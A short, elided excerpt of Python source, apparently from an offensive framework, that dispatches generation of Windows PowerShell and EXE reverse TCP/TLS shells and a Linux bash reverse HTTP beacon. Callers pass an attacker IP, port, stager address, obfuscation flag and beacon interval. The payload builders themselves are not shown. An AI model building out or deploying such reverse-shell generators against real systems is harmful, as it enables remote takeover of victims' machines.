...
def generate_payload_windows(
    ...
    if payload_type == "tcp":
        if format_type == "ps1":
            raw = powershell_reverse_tcp.generate_powershell_reverse_tcp(
                ip, port, obs, no_child
            )

        elif format_type == "exe":
            raw = exe_reverse_tcp.generate_exe_reverse_tcp(
                ip, port, stager_ip, stager_port
            )
        ...
        if format_type == "ps1":
            raw = powershell_reverse_tls.generate_powershell_reverse_tls(
                ip, port, obs, no_child
            )

        elif format_type == "exe":
            raw = exe_reverse_tls.generate_exe_reverse_tls(
                ip, port, stager_ip, stager_port
            )
...
def generate_payload_linux(
    ...
    if payload_type == "tcp":
        ...
        raw = bash_reverse_http.generate_bash_reverse_http(
            ip, port, obs, beacon_interval
        )
